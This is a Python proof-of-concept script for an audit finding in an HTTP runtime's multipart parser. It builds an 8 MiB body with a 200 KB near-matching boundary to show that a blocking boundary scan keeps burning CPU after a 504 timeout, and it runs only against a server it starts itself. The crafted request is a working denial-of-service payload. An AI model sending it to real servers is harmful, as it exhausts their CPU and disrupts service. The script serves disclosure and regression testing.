#!/usr/bin/env python3
"""R3-1: the multipart boundary scan is O(body x boundary length) and runs on
a thread that the request timeout cannot cancel.

`Content-Type: multipart/form-data; boundary=<up to ~500 KB>` is accepted
(hyper's head cap is between 500 KB and 1 MB). The parser in
crates/runtime/src/http/multipart.rs finds the boundary with a naive
`windows(needle.len()).position(...)` scan, so an 8 MiB body made of
near-boundary bytes costs body*boundary byte comparisons. The parse runs in
`tokio::task::spawn_blocking` (crates/runtime/src/lib.rs), and aborting the
request task at `--request-timeout` does NOT stop a blocking task: the client
gets its 504, but the server keeps burning a core until the scan finishes.

Measured on the release build: boundary 32 KB, body 8 MiB -> 504 at the 8 s
timeout, then CPU time kept growing ~1 s per second for 30+ s after the
response. With a 500 KB boundary the same body is ~4.2e12 comparisons
(minutes of one core per request); a handful of concurrent requests pins
every core. memchr::memmem (already a dependency) is linear.

Safe to run: the body is capped at the server's own 8 MiB limit, the client
side is bounded by read timeouts, and the whole run is under 90 s. No memory
is exhausted (the server allocates only the buffered body).

Usage: repro_r3_multipart_boundary_cpu.py   (starts its own server)
"""
import os
import sys
import time

from r3 import Server, make_site, report, split_response, status_of

BOUNDARY_LEN = 200000         # scan cost: 8 MiB * 200 KB = 1.7e12 compares (~minutes)
CAP = 8 * 1024 * 1024         # the server's own request-body cap
REQUEST_TIMEOUT = 8           # seconds; the client must get its 504 here


def main():
    boundary = b"-" * (BOUNDARY_LEN - 3) + b"!"     # mismatches only at the last byte
    header = (b"--" + boundary +
              b"\r\nContent-Disposition: form-data; name=\"f\"; filename=\"x\"\r\n\r\n")
    term = b"\r\n--" + boundary + b"--\r\n"
    body = header + b"-" * (CAP - len(header) - len(term)) + term
    assert len(body) == CAP
    content_type = f"multipart/form-data; boundary={boundary.decode()}"

    site = make_site({
        "index.php": "<?php echo 'FRONT';",
        "upload.php": "<?php echo json_encode($_FILES);",
    })
    server = Server(site, args=[f"--request-timeout", str(REQUEST_TIMEOUT)])
    try:
        cpu_before = server.cpu_seconds()
        t0 = time.time()
        resp = server.request(
            "/upload.php", [("Content-Type", content_type), ("Content-Length", str(len(body)))],
            body=body, method="POST", read_timeout=REQUEST_TIMEOUT + 30,
        )
        answered = time.time() - t0
        code = status_of(resp)[0]
        # Watch the server's CPU time AFTER the client already got its answer.
        after = []
        for _ in range(6):
            time.sleep(5)
            after.append(server.cpu_seconds())
        burn = after[-1] - after[0] if after else 0.0
        evidence = (
            f"8 MiB body with a {BOUNDARY_LEN} byte boundary: client got {code} after "
            f"{answered:.1f}s (request timeout {REQUEST_TIMEOUT}s), then the server's CPU time "
            f"grew by {burn:.1f}s over {len(after)*5}s AFTER the response "
            f"(cpu {cpu_before:.1f}s -> {after[-1]:.1f}s): the parse is not cancelled by the "
            f"request timeout"
        )
        vulnerable = code == 504 and burn > 3.0  # any burn after the 504 proves the parse was not cancelled
        return report("multipart boundary scan burns CPU after the 504", vulnerable, evidence)
    finally:
        server.stop()
        import shutil
        shutil.rmtree(site, ignore_errors=True)


if __name__ == "__main__":
    sys.exit(main())
